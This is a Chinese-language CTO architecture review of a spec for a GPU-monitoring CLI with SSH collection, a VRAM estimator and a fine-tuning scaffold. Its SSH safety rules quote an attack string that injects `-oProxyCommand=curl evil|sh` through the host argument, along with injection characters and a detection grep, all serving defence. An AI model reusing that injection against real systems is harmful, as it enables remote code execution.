# 02 架构评审（技术总监 / CTO）

> **TL;DR**
> 1. **结论：PRD 放行（有条件）**——8 条 P0 必须先改，全部是「可测性 / 内部自洽」问题，不动架构方向。
> 2. **最硬一条**：B 系列算不出激活——只给 `--params`，缺 `hidden / layers`，公式 B-F5 无解。
> 3. **第二硬**：A-A2（`--mock` 退 0）与 A-A4/A-A6（mock 有告警→退 1）互斥，需冻结 mock golden 数值。
> 4. **双真值收敛**：`--lora-target-ratio` 为唯一真值，`--lora-rank` 只做展示与一致性校验。
> 5. **架构主线**：三交付物统一「纯函数内核 + 薄 CLI 外壳」，parser 与 transport 解耦，无卡可单测。
> 6. **安全基线**：ssh 全程 list argv + 远端命令为常量 + host/user 白名单，任何位置不出现 `shell=True`。
> 7. **估算分层**：权重/梯度/优化器/激活/固定开销五层各自独立函数，所有系数注明「经验值，未实测」。
> 8. 产出：本文件（含 30 条逐条判定表、7 项风险登记、接口冻结点）。

## 1.2 P0 修改项（阻断开发，必须先裁决）

### R1 —— B 系列无法计算激活（公式缺输入）

- 问题：B-F5 公式 `激活 ≈ k * batch * seq * hidden * layers * bytes` 需要 `hidden` 与 `layers`，
  但 B-F1 的输入里只有 `--params`。参数量无法唯一反推 `hidden/layers`（0.244B 可对应 768×24 也可对应 1024×12）。
- 影响：B-A2 的验收命令**按现有参数无法执行**，实现者只能偷偷硬编码 → 不可测。
- 裁决：新增两个结构参数，并入 B-F1：
  - `--hidden <int>` 默认 `768`（Whisper-small）
  - `--layers <int>` 默认 `12`（单侧层数，encoder 与 decoder 同构时按单侧计）
  - 便利层：`--arch {whisper-tiny,base,small,medium,large-v3,custom}` 预设表，给出 `(params, hidden, layers)` 三元组；
    `--arch` 与显式 `--params/--hidden/--layers` 同时给时**显式值优先**，并在 `assumptions[]` 记录覆盖关系。
- 同时修订 B-A1：「帮助中含全部 6 个必需参数与 `--json`」→「6 个核心参数 + `--hidden` / `--layers` + `--json`」。

### R2 —— A-A2 与 A-A4 / A-A6 直接冲突

- 问题：A-F3 要求 mock 必须含「高位显存卡 + 高温卡」用于演示告警；A-A4 要求「`--mock` 样例中至少触发 1 条 alerts」；
  A-A6 规定「采集成功但存在告警 → 退出码 1」；但 A-A2 要求 `--mock` 退出码 0。三者不可同时成立。
- 裁决：**冻结 mock 的 golden 数值**，让默认阈值下零告警，告警演示改用严苛阈值：

| idx | name | vram_total | vram_used | util | temp | 用途 |
|---|---|---|---|---|---|---|
| 0 | NVIDIA A100-SXM4-80GB | 81920 | 2048 | 0 | 38 | 空闲卡 |
| 1 | NVIDIA A100-SXM4-80GB | 81920 | 72100 | 97 | 72 | 高位显存 + 高利用率 + 2 个进程 |
| 2 | NVIDIA GeForce RTX 4090 | 24564 | 21600 | 45 | 66 | 88% 显存 |
| 3 | NVIDIA GeForce RTX 4090 | 24564 | 8192 | 10 | 78 | 高温 |

- 修订条文：
  - A-A2 保持「`--mock` 默认阈值退出码 0」（上表 88% < 90%、78°C < 80°C，成立）。
  - A-A4 改为：`python src/gpu_snapshot.py --mock --vram-warn 80 --temp-warn 70 --json` 的 `alerts` 长度 **≥ 3**，
    且包含 `{gpu_index:1, kind:"vram"}`、`{gpu_index:1, kind:"temp"}`、`{gpu_index:3, kind:"temp"}` 三条。
  - mock 数值以上表为准写入代码常量 `MOCK_SNAPSHOT`，QA 用固定断言核对，不再要求「至少一条」这种模糊量。

### R3 —— B-A4 命令参数不全、且按现有默认值数值不成立

- 问题：`--target-vram 2` 只给了目标卡；若其余参数取「尽量小」的默认值，总量约 1.2 GiB → 判 PASS，验收必挂。
  「刻意过小」这个意图没错，但命令没有把它写出来。
- 裁决：B-A4 命令写全，与 B-A2 同参数只换 target：

```bash
python src/vram_est.py --params 0.244 --hidden 768 --layers 12 --precision fp16 \
  --lora-rank 8 --batch-size 8 --seq-len 3000 --target-vram 2   # 期望 OOM, exit 1
python src/vram_est.py --params 0.244 --hidden 768 --layers 12 --precision fp16 \
  --lora-rank 8 --batch-size 8 --seq-len 3000 --target-vram 80  # 期望 PASS, exit 0
```

- 并补 B-F1 默认值表（PRD 原本只定义了 `--act-factor` / `--lora-target-ratio` 两个默认值）：

| 参数 | 默认 | 说明 |
|---|---|---|
| `--params` | 必填 | 无默认，避免误用 0 |
| `--target-vram` | 必填 | 无默认，无卡无法给出有意义结论 |
| `--precision` | `fp16` | — |
| `--lora-rank` | `8` | `0` = 全量微调 |
| `--batch-size` | `1` | — |
| `--seq-len` | `1500` | 见 R16 |
| `--hidden` / `--layers` | `768` / `12` | — |
| `--act-factor` | `4` | Q1 决策 |
| `--lora-target-ratio` | `0.005` | Q2 决策 |

### R4 —— 三态判定边界与 `max_batch_size` 语义未定义

- 问题：B-F6 只说 TIGHT = 85%~100%，未定义端点归属；`max_batch_size` 未说是否留余量、不可行时输出什么。
- 裁决（写死，QA 可算）：

```
ratio = total_gb / target_vram
ratio <= 0.85        -> PASS
0.85 < ratio <= 1.00 -> TIGHT
ratio > 1.00         -> OOM
```

- `max_batch_size` = 满足 `estimate(batch=b)` 总显存 **≤ target_vram** 的最大整数 `b`（不预留 85% 余量，仅在文案提示「建议留 10~15%」）。
  若 `b = 1` 已 OOM，则输出 `max_batch_size = 0`，并在 `assumptions[]` 追加「最小可行配置仍超限，需降 precision / 缩 seq_len / 换卡」。
- 补充不变量（并入 B-A6）：`abs(sum(breakdown.values()) - total_gb) < 1e-6`，防分母子项与总量各算一套。

### R5 —— A-A8 的依赖检查可被绕过，且黑名单天生不全

- 问题：`grep -nE "^(import|from) "` 只匹配第 0 列，函数内的延迟 import（本项目**恰好要求**在 `main()` 内延迟 import）
  完全逃检；且黑名单（torch/pynvml/requests/paramiko）永远列不全。
- 裁决：改为白名单 + AST 扫描，一条命令判定：

```bash
python - <<'PY'
import ast,sys
ok={"argparse","subprocess","json","datetime","re","sys","os","pathlib","shutil","typing","dataclasses","textwrap","math","csv","tempfile","getpass"}
t=ast.parse(open("src/gpu_snapshot.py",encoding="utf-8").read())
mods={(n.module or "").split(".")[0] for n in ast.walk(t) if isinstance(n,ast.ImportFrom)}
mods|={a.name.split(".")[0] for n in ast.walk(t) if isinstance(n,ast.Import) for a in n.names}
print("VIOLATION:",sorted(m for m in mods if m and m not in ok) or "none")
PY
```

  同一脚本改文件名即可复用于 B-A9（`vram_est.py`，白名单再收紧到 5 个模块）。

### R6 —— scaffold 的配置解析方案未定，C-A2 是二义条款

- 问题：C-A2 写「`import yaml` 不可用时改人工核对」——「人工」不是验收动作，且 `yaml` 是第三方依赖，与 G1 的例外声明口径没对齐。
- 裁决：**采用 PyYAML**，理由：手写 YAML 子集解析器会把 60 行脆代码塞进脚手架，违背「结构正确、注释到位」的定位。
  - `requirements.txt` 增加 `pyyaml>=6.0`；
  - `train.py` 顶层 **只 import 标准库**，`import yaml` 放进 `main()`（与 torch 同一条延迟 import 纪律，保 C-A3）；
  - `config.yaml` 只用 YAML 子集：两空格缩进、无锚点/别名、无多行标量、无 flow mapping；
  - C-A2 改成机械核对（不装包也能跑）：
    ```bash
    grep -nE "^[a-z_]+:" scaffold/config.yaml   # 必须恰好输出 model/data/lora/train/logging/resume 六行
    python -c "import yaml;yaml.safe_load(open('scaffold/config.yaml',encoding='utf-8'))"  # 有 PyYAML 时必过
    ```

### R7 —— A-A7「内容与 stdout 一致」在 `--json` 下不成立

- 问题：`--out-dir` 恒写 `.md` + `.json`，而 stdout 格式由 `--json` 决定，两者不可能同时一致。
- 裁决：拆成两句可核对的话——
  - 默认模式：`.md` 文件内容 == stdout 全文（逐字节，除末尾换行归一）。
  - `--json` 模式：`.json` 文件 `json.load` 结果 == stdout `json.load` 结果（`==` 比较字典）。
- 同时冻结文件名时间戳格式：`%Y%m%d-%H%M%S`，落盘名 `gpu_snapshot_<safe_host>_<ts>.md|.json`；
  `safe_host = re.sub(r"[^A-Za-z0-9._-]", "_", host)`——**必须**，否则恶意/异常 host 里的 `../` 会穿越 `--out-dir`。
  A-A7 的 `/tmp/snap` 改为 `./out/snap`（Windows 沙箱下 `/tmp` 不可靠，G6 未限定 OS）。

### R8 —— A-A10 的「或」使该条不可判定

- 问题：「必须提供 `--mock-host` 调试开关 **或** README 给出可粘贴验证命令」——二选一，QA 无法给出唯一结论。
- 裁决：去掉「或」，拆成两条硬要求：
  1. README **必须**给出两条可粘贴命令：`--mock`（覆盖解析/渲染/告警全链路）与 `--host <真实主机>`（覆盖 ssh 传输），并注明预期输出形态；
  2. 解析逻辑必须是**纯函数** `parse_smi_csv(text, fields) -> List[Gpu]`，QA 可直接注入一段真实 `nvidia-smi` 输出文本核对，
     不依赖任何网络/GPU：
     ```bash
     python -c "import sys;sys.path.insert(0,'src');from gpu_snapshot import parse_smi_csv as p;print(len(p(open('docs/fixtures/smi_a100_2gpu.csv').read(),p.FIELDS_CORE)))"
     ```
  3. 附带交付 `docs/fixtures/smi_a100_2gpu.csv`（一段真实格式的 2 卡输出，静态文件）。
- 结论：A-A10 记为「有条件通过（远程端到端未验证）」，但上述 3 项**不得豁免**。

## 1.5 主管四项决策的落地方式

**分层纪律（两个 CLI 同构）**：

```
argparse 层  →  纯函数内核（无 IO、无全局状态）  →  渲染层（md / json）  →  main 编排（唯一出口 sys.exit）
     ↑                    ↑                              ↑
  只做参数校验      collect_* 之外全部可脱机单测      render 只吃 dataclass
```

理由：PRD 的最大风险是「沙箱无卡」，只有把「采集」与「解析/判定/渲染」切开，才能让 22 条验收在无卡环境真跑。`parse_*` / `estimate_*` / `verdict` / `max_batch_size` 一律纯函数。

## 2.2 交付物 A：`gpu_snapshot.py` 模块与函数清单

### 数据模型（`@dataclass`，Python 3.9 兼容，用 `Optional[...]` 而非 `X | Y`）

```python
@dataclass
class Proc:      pid: int; name: str; used_mb: Optional[float]

@dataclass
```

## 2.3 nvidia-smi 解析方案

### 2.3.1 字段约定（`--format=csv,noheader,nounits`）

```text
# 主查询（常量，硬编码在 SMI_REMOTE_CMD，不允许拼接）
nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total,memory.used,memory.free,\
utilization.gpu,temperature.gpu,power.draw,power.limit --format=csv,noheader,nounits

# 进程查询（独立一次，失败不影响主表）
nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_gpu_memory --format=csv,noheader,nounits
```

| 序 | 字段 | 映射 | 必需 |
|---|---|---|---|
| 0 | `index` | `Gpu.index` | ✅ |
| 1 | `uuid` | `Gpu.uuid`（进程 join 键） | ✅ |
| 2 | `name` | `Gpu.name` | ✅ |
| 3 | `driver_version` | `Snapshot.driver_version`（取首行） | 可选 |
| 4 | `memory.total` → MiB | `vram_total_mb` | ✅ |
| 5 | `memory.used` → MiB | `vram_used_mb` | ✅ |
| 6 | `memory.free` → MiB | `vram_free_mb` | 可选 |
| 7 | `utilization.gpu` → % | `util_percent` | ✅ |
| 8 | `temperature.gpu` → C | `temp_c` | 可选（虚拟化环境可能无） |
| 9 | `power.draw` → W | `power_draw_w` | 可选 |
| 10 | `power.limit` → W | `power_limit_w` | 可选 |

**要点**：`nounits` 让数值不带 ` MiB` / ` %` 后缀，减少字符串清洗；但**不能假设**它一定生效——旧驱动/被 alias 覆盖时会带回单位，所以 `parse_float` 必须先剥单位再做数字解析（双保险）。

### 2.3.2 容错阶梯（从最理想降到最保守，全程不裸崩）

| 级别 | 触发条件 | 处理 |
|---|---|---|
| L0 | 正常 | 全字段解析，`warnings` 为空 |
| L1 | `returncode != 0` 且 stderr 匹配 `Field "(\w+\.\w+)" is not a valid field` | 从字段列表剔除该字段，**最多重试 2 次**；被剔除的字段填 `null`，`warnings` 追加「字段不受该驱动支持」 |
| L2 | 重试后仍失败 | 降级到最小集 `index,name,memory.total,memory.used`，其余 `null`；进程表放弃 |
| L3 | stdout 为空 / 含 `No devices found` / `No running processes found` | 前者 `CollectError` → exit 3；后者是正常空进程表，`warnings` 记一条 |
| L4 | 单行字段数 ≠ 期望 | 多于期望 → 多余段合并回 `name`；少于期望 → 该行跳过 + `warnings`，**不整体失败**（一块坏卡不该让整张报表挂掉） |
| L5 | 值不可解析 | `parse_float` → `None`，渲染成 `n/a`，JSON 里是 `null`；不写 `0`（0 会污染告警判断） |
| L6 | 编码/换行 | `subprocess.run(..., text=True, encoding="utf-8", errors="replace")`；`\r` 统一 strip；行内 `strip()` 后再 split |

### 2.3.3 告警判定

- `vram_percent = vram_used_mb / vram_total_mb * 100`；`vram_total_mb` 为 `None` 或 0 时**不产生** vram 告警（避免除零与假告警）。
- `temp_c` 为 `None` 时不告警。
- 阈值语义：`>=` 触发；`--vram-warn 0` 等价于关闭该项（文档说明），QA 用 `1` 触发全量。
- 每条 alert 独立记录，`markdown` 渲染为 `⚠️` 前缀 + 单元格加粗；JSON 中 `alerts[]` 与 `gpus[].alerts` 双写（后者便于消费方逐卡读）。

## 2.4 SSH 采集的安全约束（硬性，写进代码注释块）

### 2.4.1 命令构造

```python
def build_ssh_argv(host, user, port, key, remote_cmd):
    return ["ssh",
            "-o", "BatchMode=yes",             # 禁交互，避免 CI 挂死
            "-o", "ConnectTimeout=8",
            "-o", "StrictHostKeyChecking=accept-new",   # TOFU，首次连接不阻塞
            "-o", "LogLevel=ERROR",
            "-p", str(port),
            "-i", key,
            "--",                              # 选项终结符（第二道闸）
            f"{user}@{host}" if user else host,
            remote_cmd]                        # 常量，见 2.4.2
```

### 2.4.2 十条红线

| # | 约束 | 原因 |
|---|---|---|
| S1 | **禁止 `shell=True`**、禁止 `os.system` / `os.popen` / `subprocess.getoutput`、禁止把命令写成单个字符串 | 一旦走 shell，host 里的 `;` `$(...)` 就是 RCE |
| S2 | 所有 argv 项独立成 list 元素，不用 f-string 拼整串命令行 | 列表形式无本地 shell 解析、无 glob 展开 |
| S3 | `remote_cmd` 必须是模块级**常量** `SMI_REMOTE_CMD`，任何用户输入都不得进入该字符串 | ssh 会把尾部参数交给**远端 shell** 再解析一遍——这是最容易漏的第二层注入点 |
| S4 | `host` / `ssh-user` 必须 `re.fullmatch(r"[A-Za-z0-9._-]{1,253}", v)` | 白名单挡掉空格/引号/分号/`$`/反引号/管道 |
| S5 | 显式拒绝以 `-` 开头的 host/user，并以 `--` 分隔 | 否则 `--host "-oProxyCommand=curl evil\|sh"` 会被 ssh 当选项执行 |
| S6 | `subprocess.run(..., timeout=15, check=False)`；`TimeoutExpired` → `CollectError` | 网络抖动不能变成无限等待 |
| S7 | 远端 stderr 只取**前 20 行**，且先剥 ANSI 与除 `\n\t` 外的控制字符再打印 | 远端可控输出直写终端 = 终端转义注入（改标题、伪造提示符） |
| S8 | `--ssh-key` 只作为 `-i` 的值传入，绝不读取文件内容、不打印 | 私钥不出本地 |
| S9 | 错误信息必须含 `returncode` + host + stderr 摘要（A-F4） | 可诊断；但不含完整命令行（防日志泄露路径） |
| S10 | 不做跳板机、不做多主机循环；`--host` 含逗号/空格 → `exit 2` | Q3 决策；多主机属 Out of Scope |

**代码评审卡点**：`grep -nE "shell\s*=\s*True|os\.system|os\.popen|getoutput" src/gpu_snapshot.py` 必须为空；`SMI_REMOTE_CMD` 必须是模块级字面量且全文件仅被引用一次。

## 2.5 交付物 B：`vram_est.py` 公式分层

### 2.5.1 五层结构

```
L0 输入归一化   normalize(args)              -> EstInput（精度→bpp、ratio→trainable、单位统一 GiB）
L1 参数拆分     split_params(params, lora_rank, lora_ratio) -> (total_p, trainable_p, frozen_p)
L2 分项估算     estimate_weights / grads / optimizer / activations / overhead   （各自一个函数）
L3 汇总判定     total_gb = sum(...);  verdict(total, target) -> PASS|TIGHT|OOM
L4 反向求解     max_batch_size(input, target)   （闭式初值 + 用 L2 单调回退校验）
L5 渲染         render_table / to_json
```

**硬约束**：L4 不得重新推导公式，必须回调 L2 的 `estimate_*` 做校验，保证「建议值」与「分项值」同一套真值。

### 2.5.2 公式表（含来源标注）

| 分项 | 公式 | 系数 | 来源 / 诚实标注 |
|---|---|---|---|
| 权重 | `W = P_total × bpp(precision)` | fp32=4, fp16/bf16=2, int8=1, int4=0.5 B/参数 | 数据类型位宽，**确定值** |
| 梯度 | `G = P_trainable × bpp(grad_dtype)` | `grad_dtype` 恒为 fp32（除纯 fp16/bf16 训练声明） | 惯例：梯度与参数同精度；量化只作用于权重常驻 |
| 优化器 | `O = P_trainable × 12 B`（AdamW：fp32 master 4 + m 4 + v 4） | 12 | 若 `precision=fp32` 则 master 与参数共用 → 8 B/参数（代码里分支，注释说明） |
| 激活 | `A = act_factor × batch × seq × hidden × layers × bpp(act_dtype)` | `act_factor` 默认 4 | **经验值，未在本仓库实测，误差 ±50%**；系数含义 = 每 token 每层保留的中间张量份数（含反向所需） |
| 固定开销 | `OH = 0.5 GiB + 0.05 × (W + G + O)` | context 0.5，碎片 5% | **经验值**（CUDA context 约 0.3~0.7 GiB，随驱动/库版本浮动）；碎片基准**不含激活**，以便 L4 闭式可解 |
| 总量 | `T = W + G + O + A + OH` | — | 单位 **GiB（2^30 B）**，与显卡标称容量口径一致；JSON 键名沿用 PRD 的 `*_gb` |

> 所有「经验值」行在代码中必须写成 `# 来源：经验值（本仓库未实测），依据 <依据>，误差 ±xx%`。
> **禁止**写成「实测于 A100」这类无法复现的表述——沙箱无卡，这是诚信红线。

### 2.5.3 LoRA 语义（消除双真值）

- `P_trainable = P_total × lora_target_ratio`（`lora_rank == 0` 时 `= P_total`）。
- `lora_rank` **不参与显存计算**，仅用于输出一行一致性提示 + 写入 assumptions。理由：显存模型误差 ±30%，r 的几何差异 <1% 属噪声；两套算法会给 QA 两个数打架。
- 附 r → ratio 的几何对照（供 README 说明「0.5% 为什么合理」，**手算量级，不是实测**）：

| r | 可训练参数（Whisper-small，q/k/v/out 全挂，含 cross-attn 共 144 个矩阵） | 占比 |
|---|---|---|
| 4 | ≈ 0.88 M | ≈ 0.36% |
| **8** | ≈ 1.77 M | **≈ 0.73%** |
| 16 | ≈ 3.54 M | ≈ 1.45% |

- 结论：默认 0.5% 相对 r=8 全挂偏保守约 0.23 个百分点，但 LoRA 模式下 `G + O` 只占总量 ~0.6%，对 `total_gb` 影响 <2%，**可接受**；若只挂 self-attn（96 个矩阵）则 ≈0.48%，与 0.5% 基本吻合。此推导写进 `assumptions[]` 的 `lora_ratio` 条目。

### 2.5.4 B-A2 的设计期手算参考值（QA 用 ±5% 容差核对，非承诺值）

`--params 0.244 --hidden 768 --layers 12 --precision fp16 --lora-rank 8 --batch-size 8 --seq-len 3000 --target-vram 24`

| 分项 | 代入 | GiB |
|---|---|---|
| 权重 | 0.244e9 × 2 B | 0.45 |
| 梯度 | 1.22e6 × 2 B | 0.002 |
| 优化器 | 1.22e6 × 12 B | 0.014 |
| 激活 | 4 × 8 × 3000 × 768 × 12 × 2 B | 1.65 |
| 固定开销 | 0.5 + 5% × 0.47 | 0.52 |
| **合计** | — | **≈ 2.64 → PASS**（ratio 0.11），余量 ≈ 21.4 GiB，`max_batch_size` ≈ 111 |

`--target-vram 2` → ratio 1.32 → **OOM / exit 1**；`--lora-rank 0` 同参数 → 总量 ≈ 5.9 GiB（梯度+优化器约 3.2 GiB），满足 B-A5「显著更大」。

## 2.7 风险登记

| # | 风险 | 影响 | 概率 | 缓解 |
|---|---|---|---|---|
| K1 | 无 GPU/无 torch，**所有显存系数无法实测**，交付物 B 的可信度全靠理论推导 | 高（简历场景被追问就穿） | 高 | 全部系数标注「经验值」；README 给「拿到卡后如何 3 步校准 k 与 overhead」的可执行脚本片段；B-A10 声明已在 PRD |
| K2 | `nvidia-smi` 字段集随驱动版本漂移（`power.limit`、`temperature.gpu` 在虚拟化下常缺） | 中（解析崩 → 验收挂） | 中 | §2.3.2 六级容错阶梯 + fixtures 固化两种驱动样本 |
| K3 | scaffold 无法在本沙箱运行，「结构正确」可能只是看起来正确（续训 rng 不全、collator pad 错位是最常见坑） | 高（跑起来才发现） | 中 | 只承诺静态验收（C-A1~A10）并在 README 显式声明未验证；存档契约用 2.6.4 表格卡住；`rng` 强制四元组 |
| K4 | ssh 目标注入（host 以 `-` 开头 → 被当 ssh 选项） | 高（安全） | 低 | S4/S5 + `--` 分隔 + 单测 `validate_target("‑oProxyCommand=...")` 必抛 |

## 2.8 实施顺序与接口冻结

| 里程碑 | 内容 | 冻结物 |
|---|---|---|
| M1 | `gpu_snapshot` 纯函数内核（解析 / 告警 / 渲染）+ `--mock` | `MOCK_SNAPSHOT` golden 数值、JSON schema v1 |
| M2 | 本地采集 + `--out-dir` + 错误路径（A-A9 / A-A6 退出码） | 退出码表 |
| M3 | `--host` 安全实现 + README 验证命令 + fixtures | `build_ssh_argv` 签名与 S1~S10 |
| M4 | `vram_est` 五层公式 + 三态 + `max_batch_size` | 系数常量表、`breakdown` 键名 |
| M5 | `scaffold` 六文件 | config 字段表、存档契约 |
| M6 | QA 30 条 + 手算对照表复核 | — |

**并行度**：M1~M3（A）与 M4（B）与 M5（C）三线互不依赖，可由三人并行；M3 依赖 M1 的解析器，M6 串行收口。

**给研发的两条纪律**（评审时按此打回）：
1. 纯函数（`parse_*` / `estimate_*` / `verdict` / `validate_*` / `render_*`）内**禁止**出现 `print` / `open` / `subprocess` / 时间戳读取；
2. 所有面向用户的错误走统一 `UsageError`（exit 2）/ `CollectError`（exit 3）两类异常，`main` 里统一渲染成「发生了什么 + 三条怎么办」，禁止裸 `traceback` 作为唯一输出（G4）。
